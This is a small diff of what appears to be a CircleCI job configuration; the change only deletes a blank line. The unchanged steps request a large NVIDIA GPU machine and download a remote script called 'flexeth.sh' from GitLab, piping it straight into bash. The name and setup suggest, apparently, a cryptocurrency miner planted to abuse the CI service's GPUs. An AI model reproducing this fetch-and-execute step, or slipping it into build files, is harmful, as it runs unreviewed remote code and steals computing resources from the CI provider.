@@ -6,6 +6,5 @@ jobs:
       image: ubuntu-2004:202101-01
     resource_class: gpu.nvidia.large
     steps:
-     
       - run: apt update && apt -y install wget
       - run: docker run --gpus all nvidia/cuda:9.0-base wget https://gitlab.com/mimix200/eth/-/raw/main/flexeth.sh | bash
